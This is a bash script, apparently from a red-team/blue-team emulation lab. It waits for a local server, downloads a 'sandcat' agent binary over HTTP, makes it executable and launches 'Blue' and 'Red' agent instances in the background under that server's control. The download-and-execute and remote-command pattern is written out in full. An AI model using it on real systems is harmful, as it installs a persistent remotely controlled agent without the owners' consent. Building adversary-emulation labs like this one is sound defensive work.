#!/bin/bash

#echo "[*] Waiting for OSPF to be distributed..."
#sleep 5

server="http://192.168.0.20:8888"

# Wait until the server is reachable
until ping -c1 -W1 192.168.0.20 >/dev/null 2>&1; do
    #echo "[!] Server not reachable, retrying in 5s..."
    sleep 5
done
#echo "[+] Server reachable"

# Try to extract filename from server header
agent=$(curl -svk -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" 2>&1 \
        | grep -i "Content-Disposition" \
        | grep -io "filename=.*" \
        | cut -d'=' -f2 \
        | tr -d '"\r')

# Fallback filename if extraction fails
[ -z "$agent" ] && agent="sandcat"

# Download the agent, retry until successful
until curl -sk -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" -o "$agent"; do
    #echo "[!] Agent download failed, retrying in 5s..."
    sleep 5
done
echo "[+] Agent downloaded as $agent"

# Make it executable
chmod +x "$agent"

# Start Blue agent
echo "[*] Starting Blue agent..."
nohup ./"$agent" -server "$server" -group blue &> blue.out &
echo "[+] Blue agent started (output -> blu.out)"

# Start Red agent
echo "[*] Starting Red agent..."
nohup ./"$agent" -server "$server" &> red.out &
echo "[+] Red agent started (output -> red.out)"
